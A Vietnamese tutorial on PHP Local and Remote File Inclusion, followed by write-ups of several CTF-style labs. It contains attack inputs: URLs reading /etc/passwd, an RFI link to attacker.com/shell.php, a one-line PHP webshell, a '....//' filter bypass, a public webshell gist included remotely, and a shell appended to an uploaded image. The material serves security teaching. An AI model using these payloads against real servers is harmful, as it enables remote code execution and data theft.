# File Inclusion
>Tên tài liệu: File Inclusion<br>
Thực hiện: Phạm Văn Tam <br>
Cập nhật lần cuối: 13/10/2024
>
# Mục Lục
[1. Khái niệm và các loại ](#p1) <br>
[2. Local File Inclusion (LFI)](#p2) <br>
[3. Remote File Inclusion (RFI)](#p3) <br>
[4. Lab ](#p4) <br>
# Nội dung
<a id="p1"></a>
## 1. Khái niệm và các loại
Inclusion là tính năng của ngôn ngữ lập trình giúp lập trình viên dễ dàng quản lý, tổ chức và tái sử dụng mã nguồn. <br>
File Inclusion là một lỗ hổng bảo mật trong ứng dụng web, xảy ra khi ứng dụng cho phép người dùng chỉ định tập tin (file) sẽ được nhúng vào hoặc thực thi bởi máy chủ. <br>
Có hai loại phổ biến: <br>
- Local File Inclusion (LFI)
- Remote File Inclusion (RFI) <br>
Các hàm inclusion nhận tham số truyền vào là một đường dẫn tới File hoặc một URL tùy theo ngôn ngữ lập trình <br>
File Inclusion là biến thể của Path Traversal
<a id="p2"></a>
## 2. Local File Inclusion (LFI)
Local File Inclusion (LFI) là lỗ hổng cho phép kẻ tấn công đưa nội dung của một tập tin có sẵn trên máy chủ vào ứng dụng. Khi ứng dụng không kiểm tra kỹ đầu vào, hacker có thể lợi dụng để đọc các tập tin nhạy cảm như /etc/passwd trên hệ thống Linux, hoặc các file cấu hình chứa thông tin quan trọng. <br>
Kịch bản phổ biến là ứng dụng dùng hàm include, require, include_once hoặc require_once trong PHP để nhúng file theo đường dẫn mà người dùng cung cấp. Nếu không xử lý đầu vào cẩn thận, hacker có thể thay đổi đường dẫn này để truy cập tập tin nhạy cảm. <br>
Ví dụ: <br>
URL sau: <br>
```
http://testphp.com/index.php?page=about.php
```
Nếu không kiểm tra kỹ đầu vào page, hacker có thể chỉnh sửa URL để: <br>
```
http://testphp.com/index.php?page=/etc/passwd
```
<a id="p3"></a>
## 3. Remote File Inclusion (RFI)
Remote File Inclusion (RFI) là lỗ hổng cho phép hacker nhúng và thực thi một tập tin từ một máy chủ khác. Điều này có thể dẫn đến việc thực thi mã độc hại trên máy chủ đích. RFI nguy hiểm hơn LFI vì nó cho phép hacker đưa mã độc vào từ xa và có thể chiếm quyền điều khiển máy chủ. <br>
Lỗ hổng này thường xảy ra khi ứng dụng web chấp nhận URL từ xa làm tham số và sử dụng hàm `include` hoặc `require` mà không kiểm tra kỹ đầu vào. <br>
Ví dụ : <br>
URL sau : <br>
```
http://testphp.com/index.php?page=http://attacker.com/shell.php
```
Tệp shell.php có nội dung : `<?php system($_GET['cmd']); ?>` <br>
Từ đó tệp shell.php sẽ được tải về và thực thi trên server. <br>
Lưu ý: RFI sẽ không hoạt động nếu có prefix đứng trước tham số URL
```
<?php
$page = $_GET["page"];
include("module/".$page);
echo $content;
?>
```
Thì module/http://attacker.com/shell.php sẽ không hoạt động <br>
<a id="p4"></a>
## 4. Lab
### 4.1 Learn the Capital 1
Mục tiêu của lab này là truy cập vào trang /admin mà chúng ta không có quyền. <br>
![image](https://github.com/user-attachments/assets/386338c3-6dcb-45f1-b624-df9b050e5c0a) <br>
Trang web hỏi về thủ đô của các nước và đưa ra câu trả lời: <br>
Tiên hành check source code <br>
![image](https://github.com/user-attachments/assets/2cf35f45-ef26-4741-aa64-00e4d5db678a) <br>
Giá trị của biến $page được lấy trực tiếp từ tham số `$_GET['country']` mà không có bất kỳ biện pháp lọc nào. Nếu một kẻ tấn công có thể cung cấp một đường dẫn đến tệp tin mà họ kiểm soát, họ có thể bao gồm và thực thi mã trong tệp tin đó, dẫn đến việc tấn công Local File Inclusion (LFI) hoặc Remote File Inclusion (RFI). <br>
Test thử với `/etc/passwd` : <br>
![image](https://github.com/user-attachments/assets/b4bdfb8f-3730-4fac-bab0-f1a82760668e)
Tiến hành truy cập vào trang admin <br>
![image](https://github.com/user-attachments/assets/f07f5da2-a4a1-46dc-a977-eb08d8b98654)
### 4.2 Learn the Capital 2
Ở lab này anh dev đã code thêm các tính năng bảo mật. Mục tiêu là truy cập trang admin <br>
Tiến hành check source code để xem : <br>
![image](https://github.com/user-attachments/assets/578f5fe9-9ecf-4206-a254-ba23fb053489) <br>
- Loại bỏ http:// và https:// khỏi $page: Điều này nhằm ngăn chặn tấn công kiểu Remote File Inclusion (RFI), bằng cách loại bỏ các URL bên ngoài.
- Loại bỏ các ký tự ../ và .." khỏi $page: Điều này nhằm hạn chế tấn công kiểu Local File Inclusion (LFI) bằng cách ngăn kẻ tấn công sử dụng các đường dẫn tương đối để thoát khỏi thư mục hiện tại.<br>
Liệu như này đã đủ an toàn chưa? Câu trả lời là không hihi <br>
Chúng ta có thể bypass như sau:  <br>
```
....//admin.php
```
![image](https://github.com/user-attachments/assets/66f4c4f9-17d6-46d9-99a8-15791cba6a45)
### 4.3 Learn the Capital 3
Lab này nói rằng họ đã tăng cường thêm các biện pháp bảo mật và bây giờ không dễ truy cập trang admin được nũa <br>
![image](https://github.com/user-attachments/assets/8d775505-f5bb-4e06-8b0a-11e0944f109e)
Lab này dùng hàm `strstrs` để kiểm tra biến $page xem biến $page có chứa chuỗi file hay không. Nếu tìm thấy chuỗi file thì nó sẽ báo lỗi và dừng chương trình. <br>
![image](https://github.com/user-attachments/assets/ad385835-58c4-41eb-adb9-8527eb8824da)
Liệu còn cách nào để bypass ở đây.  <br>
![image](https://github.com/user-attachments/assets/5031c845-511c-4ca6-b887-3a213b27c5f5)
### 4.4 Remote File Inclusion
phpinfo() Outputs information about PHP's configuration. Let's find phpinfo file, then create a Webshell for reading the flag file on the system. <br>
![image](https://github.com/user-attachments/assets/442e472e-73e0-47a9-8704-f311fd6329eb) <br>
Là trang web wiki CTF bắt request thì thấy rằng xuất hiện `http://103.97.125.56:30773/?file=1` thì có thể nó bị path traversal và dẫn đến file inclusion. <br>
Tên đề bài là RFI nên chúng ta sễ truyền vào 1 đoạn shell mà nó thực thi ở server khác: <br>
```
https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/c871f130a12e97090a08d0ab855c1b7a93ef1150/easy-simple-php-webshell.php
```
Truyền thành công : <br>
![image](https://github.com/user-attachments/assets/7062a004-b1ba-4fc9-ab16-61b92349ef9b)
Tiến hành leak file trên server và lấy flag : <br>
`&cmd=ls`
![image](https://github.com/user-attachments/assets/95de95cc-4dca-4066-b0a4-1aff8c1f3f24)
![image](https://github.com/user-attachments/assets/c88094cc-3751-4d22-8878-78b9be649e8f)
![image](https://github.com/user-attachments/assets/0e63baa5-a5c7-46ee-b8e5-fc55031f7e4f)
### 4.5 Baby File Inclusion
Create a Webshell for reading the flag file on the system. <br>
Trang web wiki và có chức năng upload 1 file lên <br>
Upload thử và chúng ta biết được đường dẫn tập tin upload lên server <br>
![image](https://github.com/user-attachments/assets/6e17b515-17e8-449d-9861-2634318c8dd4) <br>
Truyền đường dẫn vào thấy no được in ra màn hình vì nó không có code php <br>
![image](https://github.com/user-attachments/assets/2df15e68-e5a3-4499-879a-045b5e682d48) <br>
Bắt rq burpsuite và truyền shell vào cuối nội dung ảnh : <br>
![image](https://github.com/user-attachments/assets/9199a653-355d-44a4-b191-5fe7e426a382)



